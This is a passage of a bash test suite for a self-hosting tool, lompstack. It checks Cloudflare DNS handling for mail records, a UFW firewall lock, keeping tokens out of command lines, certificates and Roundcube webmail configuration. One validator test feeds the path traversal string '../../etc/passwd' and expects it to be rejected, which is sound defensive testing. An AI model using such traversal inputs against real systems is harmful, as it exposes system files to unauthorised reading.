_mail_dns_apply_one zone123 MX alpha.example "10 mail.alpha.example." >/dev/null || true
assert_eq    "a foreign MX stops the write" 1 "$MAIL_DNS_CONFLICTS"
assert_lacks "and nothing is deleted"       "DELETE" "$(cat "$CF_CALLS")"
: >"$CF_CALLS"; MAIL_DNS_CONFLICTS=0
_mail_dns_apply_one zone123 MX alpha.example "10 mail.alpha.example." --replace-mx >/dev/null
assert_has "--replace-mx takes it over"     "DELETE /zones/zone123/dns_records/m1" "$(cat "$CF_CALLS")"
assert_has "and writes ours"                "POST /zones/zone123/dns_records" "$(cat "$CF_CALLS")"

# a foreign MX next to ours still takes the domain's mail: the lowest preference wins
_cf_mx_json='{"success":true,"result":[{"id":"m1","content":"aspmx.l.google.com","priority":1,"comment":""},{"id":"m2","content":"mail.alpha.example","priority":10,"comment":"lompstack:mail"}]}'
MAIL_DNS_CONFLICTS=0; : >"$CF_CALLS"
_mail_dns_apply_one zone123 MX alpha.example "10 mail.alpha.example." >/dev/null || true
assert_eq "a foreign MX counts even when ours is there too" 1 "$MAIL_DNS_CONFLICTS"
# and taking it over writes ours BEFORE deleting theirs: the other way round, a refused
# write would leave the domain with no MX at all
: >"$CF_CALLS"; MAIL_DNS_CONFLICTS=0
_mail_dns_apply_one zone123 MX alpha.example "20 mail.alpha.example." --replace-mx >/dev/null
assert_eq "the write comes before the delete" "PUT
DELETE" "$(awk '/^(PUT|POST|DELETE)/{print $1}' "$CF_CALLS")"
_cf_mx_json='{"success":true,"result":[]}'

# two SPF records are the same as none, so an existing one is never overwritten
_cf_spf_json='{"success":true,"result":[{"id":"s1","content":"v=spf1 include:_spf.google.com ~all","comment":""}]}'
MAIL_DNS_CONFLICTS=0; : >"$CF_CALLS"
_mail_dns_apply_one zone123 TXT alpha.example "v=spf1 ip4:203.0.113.9 ~all" >/dev/null || true
assert_eq    "an existing SPF record is reported, not replaced" 1 "$MAIL_DNS_CONFLICTS"
assert_lacks "and nothing is written"       "POST" "$(cat "$CF_CALLS")"
_cf_spf_json='{"success":true,"result":[]}'

# DMARC and DKIM live at a name of their own, so anything already there was put there by
# somebody. A second record does not override it - two DMARC records mean no policy at all.
_cf_dmarc_json='{"success":true,"result":[{"id":"d1","content":"v=DMARC1; p=quarantine; rua=mailto:me@alpha.example","comment":""}]}'
eval '_cf_api() {
  printf "%s %s\n" "$1" "$2" >>"$CF_CALLS"
  case "$1 $2" in
    "GET /zones/zone123/dns_records?type=TXT&name=_dmarc"*) printf "%s" "$_cf_dmarc_json" ;;
    "GET /zones/zone123/dns_records?type=TXT&name=sel._domainkey"*) printf "%s" "$_cf_dkim_json" ;;
    "GET "*)  printf "%s" "{\"success\":true,\"result\":[]}" ;;
    *)        printf "%s" "{\"success\":true,\"result\":{\"id\":\"rec1\"}}" ;;
  esac
}'
_cf_dkim_json='{"success":true,"result":[]}'
MAIL_DNS_CONFLICTS=0; : >"$CF_CALLS"
_mail_dns_apply_one zone123 TXT _dmarc.alpha.example "v=DMARC1; p=none; rua=mailto:x@alpha.example" >/dev/null || true
assert_eq    "a DMARC record somebody wrote is not doubled" 1 "$MAIL_DNS_CONFLICTS"
assert_lacks "and nothing is written"                       "POST" "$(cat "$CF_CALLS")"

# Cloudflare gives a TXT value over 255 bytes back as several strings. Comparing that with
# what we mean to write would rewrite the DKIM key on every single run.
assert_eq "a chunked TXT value reads as one string" "v=DKIM1; k=rsa; p=AAAABBBB" "$(_mail_txt_norm '"v=DKIM1; k=rsa; p=AAAA" "BBBB"')"
_cf_dkim_json='{"success":true,"result":[{"id":"k1","content":"\"v=DKIM1; k=rsa; p=AAAA\" \"BBBB\"","comment":"lompstack:mail"}]}'
MAIL_DNS_APPLIED=0; : >"$CF_CALLS"
_mail_dns_apply_one zone123 TXT sel._domainkey.alpha.example "v=DKIM1; k=rsa; p=AAAABBBB" >/dev/null
assert_eq    "so the DKIM record is written once, not on every run" 0 "$MAIL_DNS_APPLIED"
assert_lacks "and no second call is made"   "PUT" "$(cat "$CF_CALLS")"

# a failed API call is not an empty zone: answering "there is nothing here" is what makes a
# caller add a second SPF or a second MX record
eval '_cf_api() { printf "%s %s\n" "$1" "$2" >>"$CF_CALLS"; printf "%s" "{\"success\":false,\"errors\":[{\"message\":\"rate limited\"}]}"; }'
MAIL_DNS_CONFLICTS=0; : >"$CF_CALLS"
assert_eq    "a refused read fails"  1 "$(run_isolated lib_cf_records zone123 TXT alpha.example)"
_mail_dns_apply_one zone123 TXT alpha.example "v=spf1 ip4:203.0.113.9 ~all" >/dev/null || true
assert_eq    "and nothing is written on top of it" 1 "$MAIL_DNS_CONFLICTS"
assert_lacks "no record is created blind"          "POST" "$(cat "$CF_CALLS")"

# a second A record at the same name sends half of every mail connection to the wrong host
eval '_cf_api() {
  printf "%s %s\n" "$1" "$2" >>"$CF_CALLS"
  case "$1 $2" in
    "GET /zones?name=alpha.example"*)         printf "%s" "$_cf_zone_json" ;;
    "GET /zones/zone123/dns_records?type=A"*) printf "%s" "$_cf_a_json" ;;
    "GET "*) printf "%s" "{\"success\":true,\"result\":[]}" ;;
    *)       printf "%s" "{\"success\":true,\"result\":{\"id\":\"rec1\"}}" ;;
  esac
}'
_cf_a_json='{"success":true,"result":[{"id":"r1","content":"203.0.113.9","proxied":false,"comment":"lompstack:mail"},{"id":"r2","content":"198.51.100.7","proxied":false,"comment":""}]}'
MAIL_DNS_CONFLICTS=0; : >"$CF_CALLS"
_mail_dns_apply_one zone123 A mail.alpha.example 203.0.113.9 >/dev/null || true
assert_eq    "a second A record is a conflict, whoever wrote the first" 1 "$MAIL_DNS_CONFLICTS"
assert_lacks "and nothing is overwritten" "PUT" "$(cat "$CF_CALLS")"
# one the operator made by hand that already says the right thing is simply left alone
_cf_a_json='{"success":true,"result":[{"id":"r2","content":"203.0.113.9","proxied":false,"comment":""}]}'
MAIL_DNS_CONFLICTS=0; MAIL_DNS_APPLIED=0; : >"$CF_CALLS"
_mail_dns_apply_one zone123 A mail.alpha.example 203.0.113.9 >/dev/null
assert_eq "a hand-made record that is already right is accepted" 0 "$((MAIL_DNS_CONFLICTS + MAIL_DNS_APPLIED))"
_cf_a_json='{"success":true,"result":[]}'

# a value the table could not fill in is a placeholder for the reader, never a live record
_dns_records_real="$(declare -f _mail_dns_records)"
eval '_mail_dns_records() { printf "A\tmail.%s\t<the IPv4 address of this server>\tnote\n" "$1"; }'
: >"$CF_CALLS"; MAIL_DNS_SKIPPED=0
printf 'dns_cloudflare_api_token = Xv8sQ2pLm9TzR4kWn1bYc7dEf0g\n' >"$CF_INI"
CF_ZONE_CACHE=()
lib_mail_dns_apply alpha.example >/dev/null 2>&1 || true
assert_eq    "a placeholder is skipped" 1 "$MAIL_DNS_SKIPPED"
assert_lacks "and never published"      "POST" "$(cat "$CF_CALLS")"
eval "$_dns_records_real"

# a dry run sends nothing at all
: >"$CF_CALLS"
printf 'dns_cloudflare_api_token = Xv8sQ2pLm9TzR4kWn1bYc7dEf0g\n' >"$CF_INI"
OPT_DRY_RUN=1
lib_mail_dns_apply alpha.example >/dev/null 2>&1 || true
OPT_DRY_RUN=0
assert_eq "a dry run sends no request" "" "$(cat "$CF_CALLS")"

# cleanup removes what lompstack wrote and nothing else
eval '_cf_api() {
  printf "%s %s\n" "$1" "$2" >>"$CF_CALLS"
  case "$1 $2" in
    "GET /zones?name=alpha.example"*) printf "%s" "{\"success\":true,\"result\":[{\"id\":\"zone123\"}]}" ;;
    "GET /zones/"*)  printf "%s" "{\"success\":true,\"result\":[{\"id\":\"mine\",\"comment\":\"lompstack:mail\"},{\"id\":\"theirs\",\"comment\":\"\"}]}" ;;
    *) printf "%s" "{\"success\":true,\"result\":{\"id\":\"mine\"}}" ;;
  esac
}'
CF_ZONE_CACHE=(); : >"$CF_CALLS"
lib_mail_dns_cleanup alpha.example >/dev/null 2>&1
assert_has   "the records lompstack wrote are deleted" "DELETE /zones/zone123/dns_records/mine" "$(cat "$CF_CALLS")"
assert_lacks "a record somebody else added stays"      "dns_records/theirs" "$(cat "$CF_CALLS")"
eval "$_cf_api_real"                   # the real one again, for the sections below
CF_INI="$TMP/cloudflare-absent.ini"

# =============================================================================
section "the origin lock"
# 80 and 443 closed to everything but Cloudflare, and the two things that must follow from it
_ol="$(declare -f lib_cf_origin_lock)"
assert_has "the lock needs a token first"       "lib_cf_token" "$_ol"
assert_has "because HTTP-01 stops working"      "DNS-01" "$_ol"
assert_has "it asks before closing the ports"   "lib_confirm" "$_ol"
assert_has "the open rules go, by number"       "_cf_ufw_web_rule_numbers" "$_ol"
assert_has "and the lock checks nothing was left open" "still open port 80 or 443" "$_ol"
assert_has "a lock schedules the refresh it promises"  "lib_cf_schedule" "$_ol"
assert_has "and every rule carries lompstack's name" 'comment "$CF_UFW_COMMENT"' "$_ol"
assert_has "certbot switches to DNS-01 while it is on" "lib_cf_origin_locked" "$(declare -f lib_ssl_obtain)"
assert_has "but only with a token to switch to"        "lib_cf_origin_locked && lib_ssl_cf_token_available" "$(declare -f lib_ssl_obtain)"
assert_has "and the weekly range refresh renews the rules" "lib_cf_origin_relock" "$(declare -f lib_cf_update_ips)"
# renewing must never unlock first: that would open the origin to everyone for the length
# of the rebuild, and an abort in between would leave it that way
assert_lacks "which never opens the ports in between" "lib_cf_origin_unlock" "$(declare -f lib_cf_update_ips)"
assert_has   "the lock's own refresh cannot re-lock behind the question" "CF_LOCK_RENEWING" "$_ol"
# a re-run of install would otherwise put "Anywhere" back next to the Cloudflare rules
assert_has "installing again leaves a locked origin locked" "lib_cf_origin_locked" "$(declare -f lib_install_ufw)"
# Which rules the lock takes away, decided on the real shape of "ufw status numbered". A rule
# may name both ports at once - 80,443/tcp is what ufw writes for a rule made that way - and
# the per-port deletion this replaced never matched one, so a hand-made combined rule survived
# the lock and left the ports open to the whole internet while lomp reported them closed. The
# lock's own rules have that very shape, so they are told apart by their comment.
_ufw_num_out='Status: active

     To                         Action      From
     --                         ------      ----
[ 1] 22/tcp                     ALLOW IN    Anywhere
[ 2] 80,443/tcp                 ALLOW IN    Anywhere                   # combined, made by hand
[ 3] 443/udp                    ALLOW IN    Anywhere
[ 4] 80/tcp                     ALLOW IN    Anywhere
[ 5] 8080/tcp                   ALLOW IN    Anywhere
[ 6] 80,443/tcp                 ALLOW IN    173.245.48.0/20            # lompstack cloudflare origin
[ 7] 443/udp                    ALLOW IN    173.245.48.0/20            # lompstack cloudflare origin
[ 8] 79:81/tcp                  ALLOW IN    203.0.113.4
[ 9] 25/tcp                     ALLOW IN    Anywhere                   # lompstack mail'
eval 'ufw() { printf "%s" "$_ufw_num_out"; }'
_webnums="$(_cf_ufw_web_rule_numbers | tr '\n' ' ')"
assert_eq  "the combined, the plain and the range rules go, highest number first" "8 4 3 2 " "$_webnums"
assert_lacks "the lock's own rules stay"        " 6 " " $_webnums"
assert_lacks "and so does 8080, which is not 80" " 5 " " $_webnums"
assert_lacks "SSH is never touched"             " 1 " " $_webnums"
assert_lacks "nor the mail ports"               " 9 " " $_webnums"
unset -f ufw
_ou="$(declare -f lib_cf_origin_unlock)"
assert_has "unlocking puts the open rules back" "lib_ufw_rule allow 80/tcp" "$_ou"

# the rules are matched back to the ranges they name, so a renewal can remove only the stale
# ones instead of deleting them all and hoping the rebuild works
eval 'ufw() { case "$*" in *numbered*) printf "%s" "$_ufw_out" ;; *) printf "%s" "$_ufw_plain" ;; esac; }'
_ufw_out='Status: active

     To                         Action      From
     --                         ------      ----
[ 1] 22/tcp                     ALLOW IN    Anywhere
[ 2] 80,443/tcp                 ALLOW IN    173.245.48.0/20            # lompstack cloudflare origin
[ 3] 443/udp                    ALLOW IN    173.245.48.0/20            # lompstack cloudflare origin
[ 4] 80/tcp                     ALLOW IN    198.51.100.10              # office staging
[10] 80,443/tcp                 ALLOW IN    2400:cb00::/32             # lompstack cloudflare origin
'
assert_eq "the lock rules are read highest number first" "10 2400:cb00::/32
3 173.245.48.0/20
2 173.245.48.0/20" "$(_cf_ufw_lock_rule_ranges)"
_ufw_plain='Status: active

To                         Action      From
--                         ------      ----
22/tcp                     ALLOW       Anywhere
80/tcp                     ALLOW       Anywhere
80,443/tcp                 ALLOW       173.245.48.0/20            # lompstack cloudflare origin
80/tcp                     ALLOW       198.51.100.10              # office staging
443/tcp (v6)               ALLOW       Anywhere (v6)
'
assert_eq "and a rule of the operator's on 80 is seen before it is deleted" \
  "80/tcp                     ALLOW       198.51.100.10              # office staging" "$(_cf_ufw_foreign_web_rules)"
unset -f ufw
# grep -c prints 0 AND fails when it counts nothing, so a fallback would print it twice
printf '# only a comment\n' >"$TMP/cf-ips-empty.conf"
assert_eq "an empty range list counts as one 0" "0" "$(CF_IPS_FILE="$TMP/cf-ips-empty.conf" _cf_ips_count)"
assert_eq "and a missing file too"              "0" "$(CF_IPS_FILE="$TMP/cf-ips-none.conf" _cf_ips_count)"

# =============================================================================
section "a secret never reaches a command line"
# /proc/<pid>/cmdline is world-readable, so every site user of this server can read the
# arguments of any command while it runs. Tokens therefore go to curl in a configuration on
# standard input, and these tests assert on what curl actually received.
_curl_argv="$TMP/curl.argv"; _curl_stdin="$TMP/curl.stdin"
: >"$_curl_argv"; : >"$_curl_stdin"
eval 'curl() { printf "%s\n" "$*" >>"$_curl_argv"; cat >"$_curl_stdin"; printf "%s" "${CURL_REPLY:-}"; }'
_cf_tok="Xv8sQ2pLm9TzR4kWn1bYc7dEf0g"
CURL_REPLY='{"result":{"status":"active"}}' CF_API_TOKEN_OVERRIDE="$_cf_tok" _cf_api GET /user/tokens/verify >/dev/null
assert_lacks "the Cloudflare token stays out of curl's arguments" "$_cf_tok" "$(cat "$_curl_argv")"
assert_has   "curl reads it from the configuration on stdin"      "$_cf_tok" "$(cat "$_curl_stdin")"
assert_has   "which carries the method" 'request = "GET"'                        "$(cat "$_curl_stdin")"
assert_has   "and the full URL"         "url = \"${CF_API}/user/tokens/verify\"" "$(cat "$_curl_stdin")"
assert_eq    "no token means no request" 1 "$(CF_API_TOKEN_OVERRIDE= CF_INI="$TMP/no-such.ini" run_isolated _cf_api GET /accounts)"

: >"$_curl_argv"; : >"$_curl_stdin"
_tg_tok="123456:ABCdefGhiJklMnoPqr"
NOTIFY_CONF="$TMP/notify.conf"
printf 'TELEGRAM_TOKEN=%s\nTELEGRAM_CHAT=-1001234567\n' "$_tg_tok" >"$NOTIFY_CONF"
lib_notify_send "disk almost full" "body" >/dev/null 2>&1 || true
assert_lacks "the Telegram token stays out of curl's arguments" "$_tg_tok" "$(cat "$_curl_argv")"
assert_has   "the URL holding it comes in on stdin" "api.telegram.org/bot${_tg_tok}/sendMessage" "$(cat "$_curl_stdin")"
assert_has   "while the chat id may stay an argument" "chat_id=-1001234567" "$(cat "$_curl_argv")"
unset -f curl

CF_INI="$TMP/cf-live.ini"; CF_F2B_ACTION="$TMP/cf-action-live.conf"; CF_F2B_AUTH="$TMP/cf-auth-live.header"
printf 'dns_cloudflare_api_token = %s\n' "$_cf_tok" >"$CF_INI"
lib_manifest_set '.cloudflare.account_id' 'acc0123456789'
lib_cf_fail2ban_action_write
_act="$(cat "$CF_F2B_ACTION")"
assert_lacks "a ban carries no token on its command line" "$_cf_tok" "$_act"
assert_has   "curl takes the header from a file"          '-H @<cfauth>' "$_act"
assert_has   "the file the action names is the one lomp wrote" "cfauth = ${CF_F2B_AUTH}" "$_act"
assert_eq    "which holds the header"  "Authorization: Bearer ${_cf_tok}" "$(cat "$CF_F2B_AUTH")"
if (( CAN_CHMOD )); then assert_eq "and only root may read it" "600" "$(stat -c %a "$CF_F2B_AUTH")"; fi
assert_lacks "the jail lines carry no token either" "$_cf_tok" "$(lib_cf_fail2ban_action_lines)"

_sec="$TMP/secret-write.conf"
_q="$OPT_QUIET"; OPT_QUIET=0; OPT_DRY_RUN=1
_out="$(printf 'dns_cloudflare_api_token = %s\n' "$_cf_tok" | lib_write_file "$_sec" 0600 "" secret 2>&1)"
_out2="$(printf 'ServerName x\n' | lib_write_file "$TMP/plain-write.conf" 0644 2>&1)"
OPT_DRY_RUN=0; OPT_QUIET="$_q"
assert_lacks "a dry run never prints a secret's contents" "$_cf_tok" "$_out"
assert_has   "it says how much it would write instead" "contents not shown" "$_out"
assert_has   "an ordinary file is still shown in full" "would create" "$_out2"
assert_false "and the dry run wrote nothing" test -e "$_sec"
printf 'dns_cloudflare_api_token = %s\n' "$_cf_tok" | lib_write_file "$_sec" 0600 "" secret
if (( CAN_CHMOD )); then assert_eq "the file itself is written 0600" "600" "$(stat -c %a "$_sec")"; fi

# =============================================================================
section "certificates for names that belong to no site"
_cert_args() {   # cert-name name...   -> the certbot command line it would run
  eval 'lib_run() { printf "%s\n" "$*"; }
        lib_pkg_installed() { [[ "$1" == "python3-certbot-dns-cloudflare" ]]; }'
  OPT_DRY_RUN=1
  lib_ssl_obtain_names "$@" 2>/dev/null
}
CF_INI="$TMP/cf-absent-for-certs.ini"; rm -f "$CF_INI"
_cb="$(_cert_args _mailhost mail.example.com)"
assert_has "one lineage for the mail host"    "--cert-name _mailhost" "$_cb"
assert_has "carrying the name asked for"      "-d mail.example.com" "$_cb"
assert_has "webroot while no token is stored" "--webroot" "$_cb"
CF_INI="$TMP/cf-present-for-certs.ini"; printf 'dns_cloudflare_api_token = %s\n' "$_cf_tok" >"$CF_INI"
_cb="$(_cert_args _mail_example_com mail.example.com webmail.example.com)"
assert_has "DNS-01 once a token is stored"  "--dns-cloudflare" "$_cb"
assert_has "both names on one certificate"  "-d mail.example.com -d webmail.example.com" "$_cb"
assert_lacks "and the token is not an argument" "$_cf_tok" "$_cb"
assert_eq "a certificate with no names is refused" 1 "$(run_isolated lib_ssl_obtain_names _mailhost)"

# A jq filter with a comma is a generator: it prints the whole object once per change, and
# the state file then holds two documents that every later read answers twice.
_js="$TMP/json-set.json"; printf '{"a":1}\n' >"$_js"
assert_eq  "a filter with a comma is refused" 1 "$(run_isolated lib_json_set "$_js" '.b = 2, .c = 3')"
assert_eq  "and the file is left as it was"  '{"a":1}' "$(tr -d ' \n' <"$_js")"
lib_json_set "$_js" '.b = 2 | .c = 3'
assert_eq  "the same thing with a pipe works" '{"a":1,"b":2,"c":3}' "$(jq -c . "$_js")"

# What a lineage covers is read from the certificate, not from certbot's renewal file: the
# file says what was asked for, the certificate says what was issued. A lineage that is
# missing a name has to be re-issued with the whole set, so the test must be exact.
if lib_have openssl; then
  LE_LIVE="$TMP/le"; mkdir -p "$LE_LIVE/_mail_x"
  # MSYS2_ARG_CONV_EXCL: under Git Bash an argument starting with "/" is rewritten into a
  # Windows path, and "/CN=..." would reach openssl as "C:/Program Files/Git/CN=...".
  # The variable means nothing on Linux.
  MSYS2_ARG_CONV_EXCL='/CN=' openssl req -x509 -newkey rsa:2048 -nodes -days 1 \
    -keyout "$LE_LIVE/_mail_x/privkey.pem" -out "$LE_LIVE/_mail_x/cert.pem" \
    -subj "/CN=mail.x.test" -addext "subjectAltName=DNS:mail.x.test,DNS:webmail.x.test" >/dev/null 2>&1
  assert_eq   "both names are read off the certificate" "mail.x.test
webmail.x.test" "$(lib_ssl_cert_names _mail_x)"
  assert_true  "and it covers them"            lib_ssl_cert_covers _mail_x mail.x.test webmail.x.test
  assert_true  "whatever the case"             lib_ssl_cert_covers _mail_x MAIL.X.TEST
  assert_false "a name that is not on it"      lib_ssl_cert_covers _mail_x mail.x.test other.x.test
  assert_false "and a lineage that is not there" lib_ssl_cert_covers _absent mail.x.test
fi

lib_ssl_hook_render >"$TMP/hook-mail.sh"
assert_true "the deploy hook still parses" bash -n "$TMP/hook-mail.sh"
_hk="$(cat "$TMP/hook-mail.sh")"
assert_has "it has its own branch for the mail lineages" "_mailhost|_mail_*)" "$_hk"
assert_has "which reloads Postfix"                       "postfix reload" "$_hk"
assert_has "and Dovecot"                                 "systemctl reload dovecot" "$_hk"
# lsws' own graceful restart replaces the process behind systemd's back; the next restart fails
assert_has   "a site's certificate restarts OpenLiteSpeed" 'systemctl restart "$OLS_SERVICE"' "$_hk"
assert_lacks "and nothing reloads lsws through systemd"    "systemctl reload lsws" "$_hk"

# =============================================================================
section "mail names, and the RAM the mail stack takes"
assert_true  "a plain local part"       lib_mail_local_valid "info"
assert_true  "dots, dashes and digits"  lib_mail_local_valid "first.last-1"
assert_false "no leading dot"           lib_mail_local_valid ".info"
assert_false "no double dot"            lib_mail_local_valid "a..b"
assert_false "no slash"                 lib_mail_local_valid "a/b"
assert_false "no path traversal"        lib_mail_local_valid "../../etc/passwd"
assert_false "not empty"                lib_mail_local_valid ""
assert_true  "a full address, any case" lib_mail_address_valid "Info@Example.COM"
assert_false "one @ and no more"        lib_mail_address_valid "a@b@example.com"
assert_false "a domain is required"     lib_mail_address_valid "info@"
assert_true  "a quota with a unit"      lib_mail_quota_valid "1G"
assert_true  "0 means no limit"         lib_mail_quota_valid "0"
assert_false "nothing free-form"        lib_mail_quota_valid "1TB"
# the leading underscore is what keeps a mail lineage out of reach of any site
assert_eq    "the mail lineage of a site"     "_mail_example_com" "$(lib_mail_cert_name example.com)"
assert_false "no site can be called that" lib_domain_valid "_mail_example_com"

SYS_ANALYZED=1; SYS_RAM_MB=4096; SYS_RAM_AVAIL_MB=3000; SYS_CPU_CORES=2; SYS_DISK_TYPE=ssd; SYS_SWAP_MB=0
DB_BUFFER_PERCENT=""; REDIS_MAX_PERCENT=""
lib_system_profile
assert_eq "nothing is reserved while mail is not installed" 0 "$CALC_MAIL_MB"
_php_no_mail="$CALC_PHP_CHILDREN_TOTAL"
lib_manifest_set '.components.mail.postfix' '3.8.6'
lib_system_profile
assert_eq "512 MB at 4 GB once the stack is there" 512 "$CALC_MAIL_MB"
assert_true "which leaves fewer PHP workers" bash -c "(( $CALC_PHP_CHILDREN_TOTAL < $_php_no_mail ))"
lib_json_set "$STATE_DIR/manifest.json" 'del(.components.mail)'
lib_system_profile
assert_eq "and the reservation goes with the stack" 0 "$CALC_MAIL_MB"

# =============================================================================
section "the webmail"
# Everything here is a pure renderer or a pure name, so the whole of it runs without root and
# without Roundcube on the machine.
assert_eq "one webmail name per domain"  "webmail.alpha.example" "$(lib_webmail_host alpha.example)"
assert_eq "and a vhost name no site can claim" "_wm_alpha_example" "$(lib_webmail_vhost_name alpha.example)"
# the pinned key: a fingerprint is 40 hex characters, and a wrong one must not be a typo
assert_true "the signing key is pinned in full" bash -c "[[ \"$WM_KEY_FPR\" =~ ^[0-9A-F]{40}$ ]]"

# PHP: Roundcube 1.7 runs on 8.1 up to but not including 8.6, and nothing else is offered
eval 'lib_php_default_version() { printf "8.3"; }
      lib_php_installed_versions() { printf "%s\n" 8.1 8.3; }'
assert_eq "the server default when it is in range" "8.3" "$(lib_webmail_php_version)"
eval 'lib_php_default_version() { printf "8.6"; }'
assert_eq "otherwise the newest that is"           "8.3" "$(lib_webmail_php_version)"
eval 'lib_php_installed_versions() { printf "%s\n" 8.0 8.6; }'
assert_eq "and nothing at all when none fits"      1     "$(run_isolated lib_webmail_php_version)"
eval 'lib_php_default_version() { printf "8.3"; }
      lib_php_installed_versions() { printf "%s\n" 8.3; }'

# the configuration is rendered whole from state, and never written empty: a failure on the
# left of a pipe would otherwise put an empty file where the credentials belong
WM_INFO="$TMP/webmail.info"; WM_CONF="$TMP/webmail-config.inc.php"; rm -f "$WM_INFO" "$WM_CONF"
assert_eq "no state, no configuration" 1 "$(run_isolated lib_webmail_render_config)"
lib_webmail_config_apply
assert_true "and nothing is written"   bash -c "[[ ! -e '$WM_CONF' ]]"
printf 'WM_DB_NAME=lomp_webmail
WM_DB_USER=lomp_webmail
WM_DB_PASS=S3cretDbPass0123456789012345
WM_DES_KEY=0123456789abcdef0123456789abcdef
' >"$WM_INFO"
CF_IPS_FILE="$TMP/cf-ips-wm.conf"
printf '# ranges
173.245.48.0/20
2400:cb00::/32
' >"$CF_IPS_FILE"
lib_json_set "$(lib_domain_json alpha.example)" '.mail.enabled = true | .mail.webmail = true'
eval 'lib_domains_list() { printf "%s\n" alpha.example; }'
_wm="$(lib_webmail_render_config)"
assert_has "IMAP goes to Dovecot over TLS on the loopback" "imap_host'] = 'ssl://127.0.0.1:993'" "$_wm"
assert_has "because Dovecot requires it even there"        "verify_peer' => false"                "$_wm"
assert_has "submission is the webmail's own port"          "smtp_host'] = '127.0.0.1:10587'"      "$_wm"
assert_has "sieve is Dovecot's"                            "managesieve_host'] = '127.0.0.1:4190'" "$_wm"
assert_has "the installer stays off"                       "enable_installer'] = false"           "$_wm"
assert_has "the log goes to the journal"                   "log_driver'] = 'syslog'"              "$_wm"
assert_has "failed logins are logged, for fail2ban"        "log_logins'] = true"                  "$_wm"
assert_has "TLS ends at the proxy"                         "use_https'] = true"                   "$_wm"
# an unescaped dot in the host pattern would also match "webmailXalphaYexample"
assert_has "every dot of a trusted host is escaped" "'^webmail\.alpha\.example\$'" "$_wm"
assert_has "Cloudflare's ranges are the only trusted proxies" "'173.245.48.0/20'" "$_wm"
assert_has "IPv6 included"                                    "'2400:cb00::/32'"  "$_wm"
# a domain whose webmail is off is not in the list of hosts it will answer for
lib_json_set "$(lib_domain_json alpha.example)" 'del(.mail.webmail)'
assert_lacks "a domain without webmail is not trusted" "webmail\.alpha" "$(lib_webmail_render_config)"
lib_json_set "$(lib_domain_json alpha.example)" '.mail.webmail = true'

# the PHP the webmail runs on: the limit is address space, and OPcache maps 512 MB before the
# first line of code. A smaller limit does not make it smaller, it makes every request a 503.
_wmx="$(lib_webmail_render_extprocessor)"
assert_has "the webmail has its own PHP user"  "extUser                 lompwebmail" "$_wmx"
assert_has "a bounded number of children"      "PHP_LSAPI_CHILDREN=4"                "$_wmx"
assert_has "and room for the OPcache segment"  "memSoftLimit            2047M"       "$_wmx"

_wmv="$(lib_webmail_render_vhconf alpha.example)"
assert_has "the docroot goes through 'current'" 'docRoot                   $VH_ROOT/current/public_html/' "$_wmv"
assert_has "it answers for the webmail name"    "vhDomain                  webmail.alpha.example"         "$_wmv"
assert_has "the shared PHP handles it"          "add                     lsapi:lsphp_webmail php"        "$_wmv"
# Roundcube ships .htaccess files for Apache; reading them under OpenLiteSpeed costs a stat
# per request and grants nothing
assert_has "no .htaccess is read"               "autoLoadHtaccess        0"  "$_wmv"
assert_has "ACME can still answer on port 80"   "context /.well-known/acme-challenge/" "$_wmv"

# fail2ban reads every file in filter.d at start and refuses to start at all when one of them
# is wrong - taking the SSH jail down with it. %(__prefix_line)s comes from common.conf.
_wmf="$(lib_webmail_render_filter)"
assert_has "the filter includes what its pattern needs" "before = common.conf" "$_wmf"
assert_has "and matches what Roundcube writes"          "Failed login" "$_wmf"
assert_true "the jail is banned on, not just written"   bash -c "[[ '$(lib_webmail_render_jail)' == *'enabled = true'* ]]"
assert_has "and it reads the journal"                   "backend = systemd" "$(lib_webmail_render_jail)"

# gpgv accepts a signature from ANY key in the keyring it is given, so the pin has to be
# compared against every primary key in the file - not the first one
_kr="$(declare -f _wm_keyring_fpr)"
assert_has  "every primary key is read, not the first" "/^pub:/{p=1; next}" "$_kr"
assert_has  "and the signature is checked against the pinned one" "VALIDSIG" "$(declare -f _wm_fetch_release)"
# Upstream's updater, when it migrates a renamed configuration key, copies the live
# configuration next to itself as config.old.php - through the symlink, so the copy is the real
# thing - with root's umask, inside a tree every user of this machine can read. The keys
# lompstack writes are current, so that branch is not reached today; it is one upstream rename
# away, and what it would leave behind is the database password and the key that decrypts every
# logged-in mailbox's IMAP password.
assert_has "the release's configuration directory is not world-readable" 'chmod 0750 "${dest}/config"' "$(declare -f _wm_fetch_release)"
assert_has "and such a copy is removed after an update"                  'rm -f "${rel}/config/"*.old.php' "$(declare -f lib_webmail_update)"
# the log directory belongs to root: OpenLiteSpeed creates the vhost logs there as root, and a
# directory the webmail user could write would let it point one at any file on the system
assert_has "the log directory is root's" '"$WM_LOG_DIR" 0750 root:root' "$(declare -f lib_webmail_dirs_ensure)"
# upstream's updater rewrites the shared configuration, and its defaults are all the unsafe
# direction; a release that is thrown away must not leave its idea of it behind
_up="$(declare -f lib_webmail_update)"
assert_has "a failed update puts the configuration back" "_wm_config_restore" "$_up"
assert_has "and a successful one is rewritten from state" "lib_webmail_config_apply" "$_up"
assert_has "the symlink flip is checked"                  "_wm_current_set" "$_up"
# the webmail record can only be cleaned out of DNS while the state still says there is one
_dis="$(declare -f lib_mail_disable_main)"
_n_clean="$(grep -n 'lib_mail_dns_cleanup' <<<"$_dis" | head -1 | cut -d: -f1)"
_n_wmoff="$(grep -n 'lib_webmail_domain_disable' <<<"$_dis" | head -1 | cut -d: -f1)"
assert_true "DNS is cleaned before the webmail is switched off" \
  bash -c "(( ${_n_clean:-0} > 0 && ${_n_wmoff:-0} > 0 && ${_n_clean:-0} < ${_n_wmoff:-0} ))"
# and the certificate is asked for both names at once
_ce="$(declare -f lib_mail_domain_cert_ensure)"
assert_has "the mail certificate covers the webmail too" "lib_webmail_host" "$_ce"
assert_has "and asks what it covers, not whether it exists" "lib_ssl_cert_covers" "$_ce"

# a state file this call created is not left behind as an empty object when the filter is bad
_js2="$TMP/json-new.json"; rm -f "$_js2"
assert_eq  "a bad filter on a new file fails"  1 "$(run_isolated lib_json_set "$_js2" '.a = 1, .b = 2')"
assert_true "and leaves no empty state behind" bash -c "[[ ! -e '$_js2' ]]"

# =============================================================================
# The mail of a domain is backed up on its own, and put back the same way
_mb="$(declare -f lib_mail_backup_domain)"
assert_has "the mail archive is its own file"      '%s-mail-%s' "$(declare -f lib_mail_backup_file)"
assert_has "with a retention of its own"           'MAIL_BACKUP_KEEP' "$_mb"
assert_has "there has to be room for the copy"     "_mail_free_kb" "$_mb"
assert_has "on the mail's own filesystem"          '_mail_free_kb "$MAIL_VMAIL_HOME"' "$_mb"
